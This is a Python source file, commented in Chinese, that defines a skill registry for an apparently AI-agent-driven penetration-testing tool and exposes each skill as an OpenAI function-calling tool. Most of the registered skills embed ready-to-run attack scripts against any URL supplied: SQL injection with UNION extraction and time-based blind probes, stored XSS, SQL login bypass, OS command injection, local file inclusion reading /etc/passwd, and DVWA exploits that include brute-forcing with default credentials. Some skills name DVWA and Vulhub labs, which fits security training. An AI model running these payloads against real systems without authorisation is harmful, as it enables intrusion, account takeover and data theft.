# -*- coding: utf-8 -*-
"""
Skills 注册表
管理所有可用的渗透测试技能
"""

import os
import json
import logging
from typing import Dict, List, Optional, Any
from pathlib import Path

from .core import (
    Skill, SkillType, SkillCategory, SkillParameter, SkillExecutor
)

logger = logging.getLogger(__name__)


class SkillRegistry:
    """技能注册表"""
    
    def __init__(self):
        self.skills: Dict[str, Skill] = {}
        self.executor = SkillExecutor()
        self._load_builtin_skills()
        self._load_cve_exploit_skills()

    def _load_cve_exploit_skills(self):
        """加载 CVE exploit 技能（Vulhub 靶场专用）"""
        try:
            from .cve_exploit_skills import get_cve_exploit_skills
            for skill in get_cve_exploit_skills():
                self.register(skill)
            logger.info(f"已加载 {len(get_cve_exploit_skills())} 个 CVE exploit 技能")
        except Exception as e:
            logger.warning(f"CVE exploit 技能加载失败: {e}")
    
    def _load_builtin_skills(self):
        """加载内置技能"""
        
        # ==================== SQL 注入 ====================
        self.register(Skill(
            id="sqli_basic",
            name="SQL注入基础检测",
            type=SkillType.POC,
            category=SkillCategory.SQL_INJECTION,
            description="检测目标是否存在基础 SQL 注入漏洞，通过注入 Payload 观察响应变化",
            parameters=[
                SkillParameter("target", "string", True, description="目标URL"),
                SkillParameter("param", "string", False, "id", "注入参数名"),
                SkillParameter("method", "string", False, "GET", "请求方法"),
            ],
            target_type="url",
            severity="high",
            cve_id=None,
            tags=["sqli", "injection", "owasp-top10"],
            executor="builtin"
        ))
        
        self.register(Skill(
            id="sqli_union",
            name="SQL注入UNION利用",
            type=SkillType.EXPLOIT,
            category=SkillCategory.SQL_INJECTION,
            description="使用 UNION SELECT 技术提取数据库数据",
            parameters=[
                SkillParameter("target", "string", True, description="目标URL"),
                SkillParameter("columns", "integer", False, 5, "列数"),
                SkillParameter("table", "string", False, "users", "目标表名"),
            ],
            target_type="url",
            severity="critical",
            tags=["sqli", "union", "data-extraction"],
            executor="python",
            code="""
import urllib.request
import urllib.parse

target = "{{target}}"
columns = {{columns}}
table_name = "{{table}}"

# 构建 UNION payload
cols = ",".join(["NULL"] * columns)
payload = f"' UNION SELECT {cols} FROM {table_name}--"
url = f"{target}?id={urllib.parse.quote(payload)}"

try:
    req = urllib.request.Request(url)
    response = urllib.request.urlopen(req, timeout=10)
    print(f"UNION Payload sent: {payload}")
    print(f"Response length: {len(response.read())}")
except Exception as e:
    print(f"Error: {e}")
"""
        ))
        
        self.register(Skill(
            id="sqli_time_blind",
            name="SQL注入时间盲注检测",
            type=SkillType.POC,
            category=SkillCategory.SQL_INJECTION,
            description="通过时间延迟检测盲注漏洞",
            parameters=[
                SkillParameter("target", "string", True, description="目标URL"),
                SkillParameter("delay", "integer", False, 5, "延迟秒数"),
            ],
            target_type="url",
            severity="high",
            tags=["sqli", "blind", "time-based"],
            executor="python",
            code="""
import urllib.request
import urllib.parse
import time

target = "{{target}}"
delay = {{delay}}

payloads = [
    f"' AND SLEEP({delay})--",
    f"'; WAITFOR DELAY '0:0:{delay}'--",
    f"' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--",
]

for payload in payloads:
    start = time.time()
    try:
        url = f"{target}?id={urllib.parse.quote(payload)}"
        req = urllib.request.Request(url)
        urllib.request.urlopen(req, timeout=delay + 5)
        elapsed = time.time() - start
        
        if elapsed >= delay:
            print(f"TIME_BLIND_FOUND: {payload} (delayed {elapsed:.2f}s)")
        else:
            print(f"NO_DELAY: {payload}")
    except Exception as e:
        print(f"ERROR: {str(e)[:50]}")
"""
        ))
        
        # ==================== XSS ====================
        self.register(Skill(
            id="xss_reflected",
            name="反射型XSS检测",
            type=SkillType.POC,
            category=SkillCategory.XSS,
            description="检测反射型跨站脚本漏洞",
            parameters=[
                SkillParameter("target", "string", True, description="目标URL"),
                SkillParameter("param", "string", False, "q", "测试参数"),
            ],
            target_type="url",
            severity="medium",
            tags=["xss", "reflected", "owasp-top10"],
            executor="builtin"
        ))
        
        self.register(Skill(
            id="xss_stored",
            name="存储型XSS检测",
            type=SkillType.POC,
            category=SkillCategory.XSS,
            description="检测存储型XSS，提交Payload后检查是否被存储和执行",
            parameters=[
                SkillParameter("target", "string", True, description="目标URL"),
                SkillParameter("field", "string", False, "comment", "注入字段"),
            ],
            target_type="url",
            severity="high",
            tags=["xss", "stored"],
            executor="python",
            code="""
import urllib.request
import urllib.parse

target = "{{target}}"
field = "{{field}}"

payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "';alert(String.fromCharCode(88,83,83))//",
]

print(f"Testing stored XSS on {target}")
print(f"Field: {field}")

for payload in payloads:
    # 提交 payload
    data = urllib.parse.urlencode({field: payload}).encode()
    req = urllib.request.Request(target, data=data, method='POST')
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    
    try:
        response = urllib.request.urlopen(req, timeout=10)
        content = response.read().decode('utf-8', errors='ignore')
        
        if payload in content:
            print(f"STORED_XSS_FOUND: {payload[:50]}")
        else:
            print(f"NOT_STORED: {payload[:30]}...")
    except Exception as e:
        print(f"ERROR: {str(e)[:50]}")
"""
        ))
        
        # ==================== 认证绕过 ====================
        self.register(Skill(
            id="auth_bypass_sql",
            name="SQL认证绕过",
            type=SkillType.EXPLOIT,
            category=SkillCategory.AUTH_BYPASS,
            description="尝试使用SQL注入绕过登录认证",
            parameters=[
                SkillParameter("target", "string", True, description="登录页面URL"),
                SkillParameter("username_field", "string", False, "username", "用户名字段"),
                SkillParameter("password_field", "string", False, "password", "密码字段"),
            ],
            target_type="url",
            severity="critical",
            tags=["auth", "bypass", "sqli"],
            executor="python",
            code="""
import urllib.request
import urllib.parse

target = "{{target}}"
username_field = "{{username_field}}"
password_field = "{{password_field}}"

bypass_payloads = [
    ("admin'--", "anything"),
    ("admin' #", "anything"),
    ("' OR '1'='1", "' OR '1'='1"),
    ("admin'/*", "*/"),
    ("' OR ''='", "' OR ''='"),
]

success_indicators = ["welcome", "dashboard", "logout", "admin", "success"]

print(f"Testing auth bypass on: {target}")

for username, password in bypass_payloads:
    data = urllib.parse.urlencode({
        username_field: username,
        password_field: password
    }).encode()
    
    req = urllib.request.Request(target, data=data, method='POST')
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    
    try:
        response = urllib.request.urlopen(req, timeout=10)
        content = response.read().decode('utf-8', errors='ignore')
        
        for indicator in success_indicators:
            if indicator.lower() in content.lower():
                print(f"AUTH_BYPASS_SUCCESS: {username}:****")
                print(f"Indicator found: {indicator}")
                break
        else:
            print(f"FAILED: {username[:20]}")
    except Exception as e:
        print(f"ERROR: {str(e)[:50]}")
"""
        ))
        
        self.register(Skill(
            id="auth_bruteforce",
            name="认证暴力破解",
            type=SkillType.BRUTEFORCE,
            category=SkillCategory.AUTH_BYPASS,
            description="对登录表单进行暴力破解",
            parameters=[
                SkillParameter("target", "string", True, description="登录页面URL"),
                SkillParameter("username", "string", False, "admin", "用户名"),
            ],
            target_type="url",
            severity="medium",
            tags=["auth", "bruteforce"],
            executor="builtin"
        ))
        
        # ==================== 信息泄露 ====================
        self.register(Skill(
            id="info_backup_files",
            name="备份文件泄露检测",
            type=SkillType.RECON,
            category=SkillCategory.INFO_DISCLOSURE,
            description="检测常见备份文件泄露",
            parameters=[
                SkillParameter("target", "string", True, description="目标URL"),
            ],
            target_type="url",
            severity="medium",
            tags=["info", "backup", "disclosure"],
            executor="python",
            code="""
import urllib.request

target = "{{target}}".rstrip('/')
backup_files = [
    "/backup.sql", "/backup.zip", "/backup.tar.gz",
    "/db.sql", "/database.sql", "/dump.sql",
    "/backup/", "/bak/", "/old/",
    "/web.config", "/.git/config", "/.svn/entries",
    "/.env", "/config.php.bak", "/wp-config.php.bak",
]

found = []
for file in backup_files:
    try:
        url = target + file
        req = urllib.request.Request(url, method='HEAD')
        response = urllib.request.urlopen(req, timeout=5)
        
        if response.status == 200:
            found.append(f"FOUND: {url}")
    except Exception as e:
        logger.debug(f"Error: {e}")

if found:
    print("\\n".join(found))
else:
    print("No backup files found")
"""
        ))
        
        self.register(Skill(
            id="info_sensitive_paths",
            name="敏感路径扫描",
            type=SkillType.RECON,
            category=SkillCategory.INFO_DISCLOSURE,
            description="扫描常见敏感路径和目录",
            parameters=[
                SkillParameter("target", "string", True, description="目标URL"),
            ],
            target_type="url",
            severity="low",
            tags=["recon", "paths"],
            executor="python",
            code="""
import urllib.request

target = "{{target}}".rstrip('/')
sensitive_paths = [
    "/admin", "/administrator", "/admin.php", "/admin/login",
    "/phpmyadmin", "/pma", "/mysql", "/myadmin",
    "/wp-admin", "/wp-login.php", "/wp-content",
    "/.git", "/.svn", "/.env", "/.htaccess",
    "/config", "/conf", "/configuration.php",
    "/api", "/api/v1", "/graphql",
    "/login", "/signin", "/register",
    "/upload", "/uploads", "/files",
    "/test", "/debug", "/dev",
    "/robots.txt", "/sitemap.xml", "/.DS_Store",
]

found = []
for path in sensitive_paths:
    try:
        url = target + path
        req = urllib.request.Request(url, method='GET')
        response = urllib.request.urlopen(req, timeout=5)
        
        if response.status in [200, 301, 302, 403]:
            found.append(f"{response.status}: {url}")
    except urllib.error.HTTPError as e:
        if e.code in [401, 403]:
            found.append(f"{e.code}: {url}")
    except Exception as e:
        logger.debug(f"Error: {e}")

if found:
    print("\\n".join(found))
else:
    print("No sensitive paths found")
"""
        ))
        
        # ==================== RCE ====================
        self.register(Skill(
            id="rce_command_injection",
            name="命令注入检测",
            type=SkillType.POC,
            category=SkillCategory.RCE,
            description="检测操作系统命令注入漏洞",
            parameters=[
                SkillParameter("target", "string", True, description="目标URL"),
                SkillParameter("param", "string", False, "cmd", "注入参数"),
            ],
            target_type="url",
            severity="critical",
            tags=["rce", "injection", "command"],
            executor="python",
            code="""
import urllib.request
import urllib.parse

target = "{{target}}"
param = "{{param}}"

payloads = [
    ";id",
    "|id",
    "`id`",
    "$(id)",
    "||id",
    "&&id",
    "; ping -c 1 127.0.0.1",
    "| ping -c 1 127.0.0.1",
]

indicators = ["uid=", "gid=", "groups=", "ping statistics", "bytes from"]

for payload in payloads:
    try:
        url = f"{target}?{param}={urllib.parse.quote(payload)}"
        req = urllib.request.Request(url)
        response = urllib.request.urlopen(req, timeout=15)
        content = response.read().decode('utf-8', errors='ignore')
        
        for indicator in indicators:
            if indicator in content:
                print(f"RCE_FOUND: {payload}")
                print(f"Evidence: {indicator}")
                break
        else:
            print(f"NO_RCE: {payload}")
    except Exception as e:
        print(f"ERROR: {str(e)[:50]}")
"""
        ))
        
        # ==================== LFI ====================
        self.register(Skill(
            id="lfi_basic",
            name="本地文件包含检测",
            type=SkillType.POC,
            category=SkillCategory.LFI,
            description="检测本地文件包含漏洞",
            parameters=[
                SkillParameter("target", "string", True, description="目标URL"),
                SkillParameter("param", "string", False, "file", "包含参数"),
            ],
            target_type="url",
            severity="high",
            tags=["lfi", "inclusion"],
            executor="python",
            code="""
import urllib.request
import urllib.parse

target = "{{target}}"
param = "{{param}}"

payloads = [
    "/etc/passwd",
    "../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "/etc/passwd%00",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://input",
    "file:///etc/passwd",
]

indicators = ["root:x:", "nobody:x:", "daemon:", "[extensions]"]

for payload in payloads:
    try:
        url = f"{target}?{param}={urllib.parse.quote(payload)}"
        req = urllib.request.Request(url)
        response = urllib.request.urlopen(req, timeout=10)
        content = response.read().decode('utf-8', errors='ignore')
        
        for indicator in indicators:
            if indicator in content:
                print(f"LFI_FOUND: {payload}")
                print(f"Evidence: {content[:200]}")
                break
        else:
            print(f"NO_LFI: {payload}")
    except Exception as e:
        print(f"ERROR: {str(e)[:50]}")
"""
        ))
        
        # ==================== DVWA 特定 ====================
        self.register(Skill(
            id="dvwa_sqli",
            name="DVWA SQL注入利用",
            type=SkillType.EXPLOIT,
            category=SkillCategory.SQL_INJECTION,
            description="针对DVWA SQL注入模块的利用",
            parameters=[
                SkillParameter("target", "string", True, description="DVWA URL"),
                SkillParameter("level", "string", False, "low", "难度级别"),
            ],
            target_type="url",
            severity="critical",
            tags=["dvwa", "sqli", "exploit"],
            executor="python",
            code="""
import urllib.request
import urllib.parse

target = "{{target}}".rstrip('/')
level = "{{level}}"

# DVWA SQL注入页面
sqli_url = f"{target}/vulnerabilities/sqli/"

# 常见 DVWA 凭据
cookies = "security=low; PHPSESSID=dvwa"

payloads = {
    "low": [
        "' OR '1'='1",
        "' UNION SELECT user,password FROM users--",
        "' UNION SELECT NULL,NULL--",
    ],
    "medium": [
        "1 OR 1=1",
        "1 UNION SELECT user,password FROM users",
    ],
    "high": [
        "' OR '1'='1' LIMIT 1--",
    ]
}

for payload in payloads.get(level, payloads["low"]):
    try:
        url = f"{sqli_url}?id={urllib.parse.quote(payload)}&Submit=Submit"
        req = urllib.request.Request(url)
        req.add_header('Cookie', cookies)
        
        response = urllib.request.urlopen(req, timeout=10)
        content = response.read().decode('utf-8', errors='ignore')
        
        # 检测成功标志
        if "admin" in content.lower() or "password" in content.lower():
            print(f"DVWA_SQLI_SUCCESS: {payload}")
            # 提取数据
            import re
            users = re.findall(r'([\\w]+):([\\w]+)', content)
            if users:
                print(f"EXTRACTED: {users[:3]}")
        else:
            print(f"FAILED: {payload[:30]}")
    except Exception as e:
        print(f"ERROR: {str(e)[:50]}")
"""
        ))
        
        self.register(Skill(
            id="dvwa_xss",
            name="DVWA XSS利用",
            type=SkillType.EXPLOIT,
            category=SkillCategory.XSS,
            description="针对DVWA XSS模块的利用",
            parameters=[
                SkillParameter("target", "string", True, description="DVWA URL"),
            ],
            target_type="url",
            severity="medium",
            tags=["dvwa", "xss"],
            executor="python",
            code="""
import urllib.request
import urllib.parse

target = "{{target}}".rstrip('/')
xss_url = f"{target}/vulnerabilities/xss_r/"
cookies = "security=low; PHPSESSID=dvwa"

payloads = [
    "<script>alert(document.cookie)</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg onload=alert(document.cookie)>",
]

for payload in payloads:
    try:
        url = f"{xss_url}?name={urllib.parse.quote(payload)}"
        req = urllib.request.Request(url)
        req.add_header('Cookie', cookies)
        
        response = urllib.request.urlopen(req, timeout=10)
        content = response.read().decode('utf-8', errors='ignore')
        
        if payload in content:
            print(f"DVWA_XSS_SUCCESS: {payload}")
        else:
            print(f"PAYLOAD_MODIFIED: checking...")
            if "<script>" in content.lower():
                print("XSS vector present in response")
    except Exception as e:
        print(f"ERROR: {str(e)[:50]}")
"""
        ))
        
        self.register(Skill(
            id="dvwa_bruteforce",
            name="DVWA暴力破解",
            type=SkillType.BRUTEFORCE,
            category=SkillCategory.AUTH_BYPASS,
            description="暴力破解DVWA登录",
            parameters=[
                SkillParameter("target", "string", True, description="DVWA URL"),
            ],
            target_type="url",
            severity="medium",
            tags=["dvwa", "bruteforce"],
            executor="python",
            code="""
import urllib.request
import urllib.parse

target = "{{target}}".rstrip('/')
login_url = f"{target}/login.php"

# DVWA 默认凭据
credentials = [
    ("admin", "password"),
    ("admin", "admin"),
    ("admin", "123456"),
    ("gordonb", "abc123"),
    ("1337", "charley"),
    ("pablo", "letmein"),
    ("smithy", "password"),
]

for username, password in credentials:
    try:
        data = urllib.parse.urlencode({
            "username": username,
            "password": password,
            "Login": "Login"
        }).encode()
        
        req = urllib.request.Request(login_url, data=data, method='POST')
        req.add_header('Content-Type', 'application/x-www-form-urlencoded')
        
        response = urllib.request.urlopen(req, timeout=10)
        content = response.read().decode('utf-8', errors='ignore')
        
        # 检测成功标志
        if "index.php" in content or "Welcome" in content:
            print(f"LOGIN_SUCCESS: {username}:****")
            break
        else:
            print(f"FAILED: {username}:****")
    except Exception as e:
        if "redirect" in str(e).lower():
            print(f"LOGIN_SUCCESS: {username}:****")
"""
        ))
        
        logger.info(f"已加载 {len(self.skills)} 个内置技能")
        
        # 加载扩展 Skills (来自优秀项目)
        self._load_extended_skills()
    
    def _load_extended_skills(self):
        """加载扩展技能 (整合自 CyberStrikeAI, PentestGPT, NeuroSploit)"""
        try:
            from .extended_skills import get_extended_skills
            extended = get_extended_skills()
            for skill in extended:
                self.register(skill)
            logger.info(f"已加载 {len(extended)} 个扩展技能")
        except Exception as e:
            logger.warning(f"加载扩展技能失败: {e}")
        
        # 加载增强检测技能
        self._load_enhanced_detection_skills()
    
    def _load_enhanced_detection_skills(self):
        """加载增强检测技能 - 基于vuln_detector"""
        try:
            from ..vuln_detector import EnhancedVulnerabilityDetector, quick_scan, deep_scan
            
            # 快速扫描技能
            self.register(Skill(
                id="vuln_quick_scan",
                name="漏洞快速扫描",
                type=SkillType.SCANNER,
                category=SkillCategory.GENERAL,
                description="快速扫描目标常见漏洞，包括SQLi、XSS、RCE、LFI等",
                parameters=[
                    SkillParameter("target", "string", True, description="目标URL"),
                ],
                target_type="url",
                severity="high",
                tags=["scan", "vulnerability", "detection"],
                executor="builtin"
            ))
            
            # 深度扫描技能
            self.register(Skill(
                id="vuln_deep_scan",
                name="漏洞深度扫描",
                type=SkillType.SCANNER,
                category=SkillCategory.GENERAL,
                description="深度扫描目标，多轮验证，减少误报，提高检测率",
                parameters=[
                    SkillParameter("target", "string", True, description="目标URL"),
                ],
                target_type="url",
                severity="high",
                tags=["scan", "deep", "verification"],
                executor="builtin"
            ))
            
            # WAF检测技能
            self.register(Skill(
                id="waf_detection",
                name="WAF防火墙检测",
                type=SkillType.RECON,
                category=SkillCategory.GENERAL,
                description="检测目标是否存在WAF，识别WAF类型（Cloudflare、AWS WAF等）",
                parameters=[
                    SkillParameter("target", "string", True, description="目标URL"),
                ],
                target_type="url",
                severity="info",
                tags=["waf", "firewall", "recon"],
                executor="builtin"
            ))
            
            logger.info("已加载增强检测技能")
        except Exception as e:
            logger.warning(f"加载增强检测技能失败: {e}")
    
    def register(self, skill: Skill):
        """注册技能"""
        self.skills[skill.id] = skill
        logger.debug(f"注册技能: {skill.id} - {skill.name}")
    
    def unregister(self, skill_id: str):
        """注销技能"""
        if skill_id in self.skills:
            del self.skills[skill_id]
    
    def get(self, skill_id: str) -> Optional[Skill]:
        """获取技能"""
        return self.skills.get(skill_id)

    def get_skill(self, skill_id: str) -> Optional[Skill]:
        """获取技能（get 的别名，兼容旧调用）"""
        return self.get(skill_id)

    def get_all_skill_names(self) -> List[str]:
        """返回所有技能 ID 列表"""
        return list(self.skills.keys())
    
    def list(self, 
             type: SkillType = None,
             category: SkillCategory = None,
             severity: str = None,
             tags: List[str] = None) -> List[Skill]:
        """列出技能"""
        result = list(self.skills.values())
        
        if type:
            result = [s for s in result if s.type == type]
        if category:
            result = [s for s in result if s.category == category]
        if severity:
            result = [s for s in result if s.severity == severity]
        if tags:
            result = [s for s in result if any(t in s.tags for t in tags)]
        
        return result
    
    def execute(self, skill_id: str, params: Dict[str, Any]) -> Dict[str, Any]:
        """执行技能"""
        skill = self.get(skill_id)
        if not skill:
            return {"success": False, "error": f"技能不存在: {skill_id}"}
        
        return self.executor.execute(skill, params)
    
    def get_openai_tools(self) -> List[Dict[str, Any]]:
        """获取所有技能的 OpenAI Function Calling Schema"""
        return [skill.get_openai_schema() for skill in self.skills.values() if skill.enabled]
    
    def search(self, query: str, top_k: int = 5) -> List[Skill]:
        """搜索技能"""
        query_lower = query.lower()
        results = []
        
        for skill in self.skills.values():
            score = 0
            if query_lower in skill.name.lower():
                score += 3
            if query_lower in skill.description.lower():
                score += 2
            if any(query_lower in tag.lower() for tag in skill.tags):
                score += 1
            
            if score > 0:
                results.append((score, skill))
        
        results.sort(key=lambda x: x[0], reverse=True)
        return [s for _, s in results[:top_k]]


# 全局注册表
_registry: Optional[SkillRegistry] = None


def get_skill_registry() -> SkillRegistry:
    """获取全局技能注册表"""
    global _registry
    if _registry is None:
        _registry = SkillRegistry()
    return _registry
